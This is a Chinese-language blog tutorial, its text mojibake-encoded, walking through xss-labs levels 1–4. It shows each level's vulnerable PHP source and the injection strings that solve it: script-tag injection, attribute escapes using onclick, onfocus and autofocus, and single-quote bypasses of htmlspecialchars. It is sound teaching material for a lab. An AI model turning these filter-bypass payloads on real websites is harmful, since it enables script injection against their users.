<h3 id="5-XSS-æ”»å‡»ä¸­çš„-åµŒå¥—åˆ©ç”¨"><a href="#5-XSS-æ”»å‡»ä¸­çš„-åµŒå¥—åˆ©ç”¨" class="headerlink" title="5. XSS æ”»å‡»ä¸­çš„ &lt;script&gt; åµŒå¥—åˆ©ç”¨"></a>5. XSS æ”»å‡»ä¸­çš„ <code>&lt;script&gt;</code> åµŒå¥—åˆ©ç”¨</h3><p>æ”»å‡»è€…å¯èƒ½å°è¯•åœ¨éæ ‡å‡†ä½ç½®æ³¨å…¥è„šæœ¬ä»¥ç»•è¿‡è¿‡æ»¤ï¼š</p>
<h4 id="åœºæ™¯-1ï¼šå±æ€§å†…çš„è„šæœ¬"><a href="#åœºæ™¯-1ï¼šå±æ€§å†…çš„è„šæœ¬" class="headerlink" title="åœºæ™¯ 1ï¼šå±æ€§å†…çš„è„šæœ¬"></a>åœºæ™¯ 1ï¼šå±æ€§å†…çš„è„šæœ¬</h4><ul>
<li>åˆ©ç”¨äº‹ä»¶å±æ€§æ‰§è¡Œä»£ç ï¼ˆæ— éœ€ <code>&lt;script&gt;</code> æ ‡ç­¾ï¼‰ï¼š<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span> <span class="comment">&lt;!-- é€šè¿‡äº‹ä»¶è§¦å‘ --&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="åœºæ™¯-2ï¼šé—­åˆæ ‡ç­¾æ³¨å…¥"><a href="#åœºæ™¯-2ï¼šé—­åˆæ ‡ç­¾æ³¨å…¥" class="headerlink" title="åœºæ™¯ 2ï¼šé—­åˆæ ‡ç­¾æ³¨å…¥"></a>åœºæ™¯ 2ï¼šé—­åˆæ ‡ç­¾æ³¨å…¥</h4><ul>
<li>é€šè¿‡é—­åˆçˆ¶æ ‡ç­¾æå‰ç»“æŸä¸Šä¸‹æ–‡ï¼Œæ’å…¥ <code>&lt;script&gt;</code>ï¼š<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!-- é—­åˆåŸæœ‰æ ‡ç­¾ --&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="åœºæ™¯-3ï¼šåˆ©ç”¨-HTML-è§£æç‰¹æ€§"><a href="#åœºæ™¯-3ï¼šåˆ©ç”¨-HTML-è§£æç‰¹æ€§" class="headerlink" title="åœºæ™¯ 3ï¼šåˆ©ç”¨ HTML è§£æç‰¹æ€§"></a>åœºæ™¯ 3ï¼šåˆ©ç”¨ HTML è§£æç‰¹æ€§</h4><ul>
<li>æŸäº›ä¸Šä¸‹æ–‡å…è®¸çœç•¥é—­åˆæ ‡ç­¾æˆ–ç‰¹æ®Šå­—ç¬¦ï¼š<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- å®é™…ä¸ä¼šæ‰§è¡Œï¼Œå› ä¸º &lt;script&gt; è¢«å½“ä½œæ–‡æœ¬å†…å®¹ --&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h1 id="ä¸‰ã€xss-labsè§£é¢˜æ€è·¯-æºç åˆ†æ"><a href="#ä¸‰ã€xss-labsè§£é¢˜æ€è·¯-æºç åˆ†æ" class="headerlink" title="ä¸‰ã€xss-labsè§£é¢˜æ€è·¯+æºç åˆ†æ"></a>ä¸‰ã€xss-labsè§£é¢˜æ€è·¯+æºç åˆ†æ</h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>ç±»å‹ï¼šurlç±»æ€§</p>
<p>è§£é¢˜æ€è·¯ï¼š<br>1.ç¬¬ä¸€ä¸ªæ²¡æœ‰ä»»ä½•çš„è¾“å…¥æ¡†ï¼Œç‚¹è§£å›¾ç‰‡ä¹Ÿæ²¡æœ‰ä»»ä½•å˜åŒ–<br>2.çªç ´å£-&gt;ç½‘å€æ -&gt;éšä¾¿è¾“å…¥å‡ æ¬¡æ•°æ®è§‚å¯Ÿç½‘é¡µæƒ…å†µ<br>3.æŸ¥çœ‹ç½‘é¡µæºç -&gt;å˜åŒ–åŒ–å¤„çš„æ ‡ç­¾</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_1.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<p>å¤–å±‚æ ‡ç­¾æ˜¯h1 æ–‡æœ¬ä¾¿ç­¾ï¼ŒåµŒå…¥scriptæ ‡ç­¾çš„è„šæœ¬å¯ä»¥å‘æŒ¥ä½œç”¨<br>å› æ­¤ï¼Œåªéœ€è¦å±äºä¸€æ®µå®Œæ•´çš„è„šæœ¬å³å¯</p>
<p> æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span><br><span class="line"> <span class="comment">//window åœ¨åŠ è½½å®Œæ‰€æœ‰å…ƒç´ åï¼Œæ‰ä¼šæ‰§è¡Œè¿™ä¸ªè¯­å¥  href=&quot;è·³è½¬é“¾æ¥&quot;ï¼›</span></span><br><span class="line"> <span class="comment">//åœ¨level1è¿™ä¸€å…³çš„ç½‘é¡µæ§åˆ¶å°è¾“å…¥ window.location.href=&quot;level2.php?keyword=test&quot;; å°±ä¼šè·³è½¬è‡³ç¬¬äºŒå…³</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level1&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];   <span class="comment">//æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥å°†å†…å®¹èµ‹å€¼ç»™å˜é‡$str</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/h2&gt;&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">ç”±äºæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œåªéœ€è¾“å…¥ç®€å•çš„jsä»£ç å°±å¯ä»¥é€šè¿‡,ä¾‹å¦‚ï¼š</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;GGBOND&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;GGBOND&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //</span><br><span class="line"></span><br><span class="line">æ³¨æ„ï¼š1.ä¸è¦å¿˜è®°å†™ä¸Šåˆ†å· 2.æ¢æµ‹æ—¶æœ€å¥½ç”¨å­—ç¬¦ä¸²æ¢æµ‹ï¼ˆå¯ä»¥è·å–ç½‘é¡µå›æ˜¾çš„ä¿¡æ¯-&gt;åˆ¤æ–­æ˜¯ä»€ä¹ˆç±»å‹çš„é˜²æŠ¤ï¼‰</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>ç±»å‹ï¼šè¾“å…¥æ¡†ç±»å‹</p>
<p>è§£é¢˜æ€è·¯ï¼š<br>1.æœ‰è¾“å…¥æ¡†â€“&gt;value-&gt;å­—ç¬¦é€ƒé€¸<br>2.è¾“å…¥æµ‹è¯•è¯­å¥-&gt;æŸ¥çœ‹å˜åŒ–å¤„çš„æºç (é‡ç‚¹å…³æ³¨value)</p>
<p>æµ‹è¯•è¯­å¥</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alter</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_2.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<ul>
<li><p>1.è¾“å…¥çš„è¯­å¥æ²¡æœ‰ç¼ºå¤±æˆ–è€…æ˜¯æ”¹å˜</p>
</li>
<li><p>2.æœªè¾“å…¥è¯­å¥æ—¶ value&#x3D;â€ â€œ ,è¾“å…¥å æœ‰ä¸€éƒ¨åˆ†æ©™è‰²ï¼Œä¸€éƒ¨åˆ†è“è‰² ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œç½‘é¡µæºä»£ç æ©™è‰²æ˜¯å€¼ï¼Œè“è‰²æ˜¯æ ‡ç­¾ã€‚</p>
</li>
</ul>
<p>å‡ºç°è¿™ç§æƒ…å†µæ˜¯å› ä¸ºæ²¡æœ‰é—­åˆï¼Œå¯¼è‡´æ ‡ç­¾æ··ä¹±</p>
<p>è§£å†³æ–¹æ³•ï¼šé—­åˆvalue</p>
<h3 id="å­—ç¬¦é€ƒé€¸"><a href="#å­—ç¬¦é€ƒé€¸" class="headerlink" title="*å­—ç¬¦é€ƒé€¸"></a>*å­—ç¬¦é€ƒé€¸</h3><p>1.ä»…ä»…è¾“å…¥ â€œ ï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_3.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>é—­åˆäº†å‰å¼•å·</p>
<p>2.è¾“å…¥ â€œ&gt;</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_4.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>â€œ &gt;  é€ƒé€¸å‡ºinputæ ‡ç­¾ï¼Œä¸‹å›¾ä¸ºæ­¤æ—¶çš„é¡µé¢æ¸²æŸ“</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_5.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<p>æ‰€ä»¥åªéœ€åœ¨ä¹‹ååŠ ä¸Šç›¸åº”çš„è¯­å¥å³å¯é€šå…³</p>
<p>3.é™¤äº†é€ƒé€¸ï¼Œè¿˜å¯ä»¥æ„é€ ä¸ºinputçš„å±æ€§ </p>
<p>å…·ä½“è¯­å¥åœ¨ä¸‹æ–¹æºç åˆ†æ</p>
<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level3.php?writing=wait&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level2&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level2&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];  <span class="comment">//keywordçš„å€¼å°±æ˜¯valueçš„å€¼ï¼Œå³å˜é‡$_GETèµ‹å€¼ç»™$str</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;  </span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//ä½¿ç”¨è½¬ä¹‰å‡½æ•°ï¼ˆç»å¸¸å‡ºç°ï¼‰ï¼šhtmlspecialchars($str)  å°†$strçš„å€¼è¿›è¡Œå®ä¾‹åŒ–è½¬ä¹‰   --&gt;ä¹‹åä¾‹å­ä¼šè¿›ä¸€æ­¥è§£é‡Š  æ³¨æ„:è¿™é‡Œåªæ˜¯å¯¹è¾“å‡ºçš„$strè¿›è¡Œå®ä¾‹åŒ–è½¬ä¹‰</span></span><br><span class="line"><span class="comment">//htmlspecialchars() æ˜¯ PHP ä¸­ç”¨äºå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“çš„å‡½æ•°ï¼Œå…¶ä¸»è¦ä½œç”¨æ˜¯é˜²æ­¢ XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰</span></span><br><span class="line"><span class="comment">//htmlspecialchars() é»˜è®¤ä¼šè½¬ä¹‰5ä¸ªå­—ç¬¦,å…¶ä»–å­—ç¬¦ä¸ä¼šè½¬ä¹‰</span></span><br><span class="line"><span class="comment">//&quot; &#x27; &lt; &gt; &amp;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//æ³¨å…¥è¯­å¥</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;GGBOND&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //    é€ƒé€¸</span><br><span class="line">&quot; onclick=&#x27;alert(&quot;GGBOND)  //</span><br><span class="line">&quot; onfocus=&#x27;alert(&quot;GGBOND&quot;)  //   </span><br><span class="line">ä»¥ä¸Šéœ€è¦è‡ªä¸»ç‚¹å‡»è¾“å…¥æ¡†</span><br><span class="line">&quot; autofocus=&#x27;alert(&quot;GGBOND&quot;)&#x27; //  </span><br><span class="line">è‡ªåŠ¨ç‚¹å‡»</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>ç±»å‹ï¼šè¾“å…¥æ¡†ç±»å‹</p>
<p>è§£é¢˜æ€è·¯ï¼š<br>è¿›è¡Œåˆæ­¥åˆ†æï¼š<br>1.è¾“å…¥æµ‹è¯•è¯­å¥ï¼ˆé—­åˆä¸ä¸é—­åˆï¼‰<br>2.æŸ¥çœ‹ç½‘é¡µæºç -&gt;valueçš„æƒ…å†µ<br>3.é€‰ä¸­valueçš„å€¼ï¼Œå³é”®é€‰ä¸­ä¿®æ”¹html</p>
<p>æŸ¥çœ‹æ˜¯å¦è¢«å®ä¾‹åŒ–è½¬ä¹‰ï¼ˆæŒ‡valueçš„å€¼ï¼‰</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">æ³¨å…¥è¯­å¥ï¼š   &quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_6.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>æŸ¥çœ‹ï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_7.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_8.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>ç”±ä¸Šå›¾å¯çŸ¥ï¼Œè¾“å…¥çš„è¯­å¥è¢«å®ä¾‹åŒ–è½¬ä¹‰åæ‰ä½œä¸ºvalueçš„å€¼</p>
<p>åœ¨level2è¾“å…¥åŒæ ·çš„è¯­å¥å¹¶è¿›è¡ŒæŸ¥çœ‹value</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_9.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>valueçš„å€¼æ²¡æœ‰è¢«å®ä¾‹åŒ–è½¬ä¹‰ï¼Œè¿™å°±æ˜¯level2 ä¸ level3 æœ€å¤§çš„åŒºåˆ«</p>
<p>ç»†èŠ‚ï¼šalert(å®ä¾‹åŒ–åçš„å†…å®¹);  ä»è¿™é‡Œå°±å¯ä»¥å‘ç°ï¼šè¾“å…¥å­—ç¬¦ä¸²å¯ä»¥è·å¾—æ›´å¤šçš„å›æ˜¾ä¿¡æ¯</p>
<h3 id="é»˜è®¤Htmlspecialchars-å‡½æ•°"><a href="#é»˜è®¤Htmlspecialchars-å‡½æ•°" class="headerlink" title="*é»˜è®¤Htmlspecialchars()å‡½æ•°"></a>*é»˜è®¤Htmlspecialchars()å‡½æ•°</h3><p>æ²¡æœ‰è½¬ä¹‰å•å¼•å·ï¼Œå¯ä»¥ä½¿ç”¨å•å¼•å·é—­åˆ</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">æ³¨å…¥è¯­å¥ï¼š</span><br><span class="line">//éœ€è¦æ‰‹åŠ¨ç‚¹å‡»æ‰§è¡Œ</span><br><span class="line">&#x27; onclick=&#x27;alert(&quot;123&quot;)&#x27; //    ä¸è¦ç”¨åŒå¼•å·åŒ…è£¹ï¼Œå› ä¸ºåŒå¼•å·ä¼šè¢«è½¬ä¹‰</span><br><span class="line">&#x27; onclick=alert(&quot;123&quot;) //      æ— å¼•å·åŒ…è£¹ï¼Œä»ç„¶å¯ä»¥æ‰§è¡Œ</span><br><span class="line">&#x27; onfocus=console.log(&quot;123&quot;) //   æ§åˆ¶å°è¾“å‡º</span><br><span class="line">//è‡ªåŠ¨æ‰§è¡Œ</span><br><span class="line">autofocus=alert(&quot;123&quot;) //</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é—®é¢˜ï¼šä¸ºä»€ä¹ˆä¸ç”¨å¼•å·åŒ…è£¹jså‡½æ•°ä»ç„¶å¯ä»¥æ‰§è¡Œå‘¢ï¼Ÿ</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ï¼š&#x27; onclick=alert(&quot;123&quot;) //  </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_10.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>æµè§ˆå™¨ä¼šè‡ªåŠ¨è¡¥å…¨å¼•å·ï¼Œå³æµè§ˆå™¨çš„å®¹é”™åŠŸèƒ½å‘æŒ¥ä½œç”¨</p>
<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level4.php?keyword=try harder!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level3&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level3&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="comment">//ä½¿ç”¨å®ä¾‹åŒ–è½¬ä¹‰å‡½æ•°ï¼Œé»˜è®¤ä¸ä¼šè½¬ä¹‰å•å¼•å·</span></span><br><span class="line"><span class="comment">//htmlspecialchars($str,ENT_QUOTES)  å°±ä¼šè½¬ä¹‰å•å¼•å·</span></span><br><span class="line"><span class="comment">//ä½¿ç”¨å®ä½“è½¬ä¹‰å‡½æ•°ï¼Œé»˜è®¤ä¸ä¼šè½¬ä¹‰å•å¼•å·</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;      </span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;                                     </span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;	   </span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<hr>
<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>ç±»å‹ï¼šè¾“å…¥æ¡†ç±»å‹</p>
<p>è§£é¢˜æ€è·¯ï¼š</p>
<p>è¾“å…¥æµ‹è¯•è¯­å¥</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_11.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>æ£€æŸ¥æ˜¯å¦è¢«å®ä¾‹åŒ–è½¬ä¹‰</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_12.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>&lt; &gt; &#x2F; åˆ«æ›¿æ¢ä¸ºç©º  </li>
<li>alertæ‹¬å·ä¸­çš„åŒå¼•å·æ²¡æœ‰æ²¡æ›¿æ¢æˆ–æ˜¯å®ä¾‹åŒ–è½¬ä¹‰ï¼Œå³æ²¡æœ‰è¿‡æ»¤åŒå¼•å·</li>
<li>è¾“å…¥çš„è¯­å¥æœ‰æ©™è‰²ï¼Œè“è‰²éƒ¨åˆ†ï¼ˆè¢«æµè§ˆå™¨å½“ä½œæ ‡ç­¾ï¼‰</li>
<li>alertæ‹¬å·å†…çš„ç¬¬ä¸€ä¸ªåŒå¼•å·ä¸valueçš„ç¬¬ä¸€ä¸ªåŒå·é—­åˆï¼Œä¹‹åçš„å†…å®¹å‡è¢«è®¤å®šä¸ºæ ‡ç­¾</li>
</ul>
<p>å°è¯•é—­åˆ</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_13.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>é—­åˆæˆåŠŸï¼Œä½†æ³¨å…¥è¯­å¥ä»è¢«è¯¥æ ‡ç­¾åŒ…å«ï¼Œä¸èƒ½å‘æŒ¥ä½œç”¨</p>
<h3 id="æ’å…¥å±æ€§"><a href="#æ’å…¥å±æ€§" class="headerlink" title="*æ’å…¥å±æ€§"></a>*æ’å…¥å±æ€§</h3><p>ç”±äº&lt;  &gt; &#x2F; å‡è¢«è¿‡æ»¤ï¼Œæ’å…¥ä¸€ä¸ªå®Œæ•´çš„æ ‡ç­¾æ¯”è¾ƒå›°éš¾ï¼Œå¯ä»¥é€‰æ‹©æ’å…¥å±æ€§</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; //</span><br><span class="line">ç”¨&#x27;æ— æ³•é—­åˆvalueçš„åŒå¼•å·</span><br></pre></td></tr></table></figure>

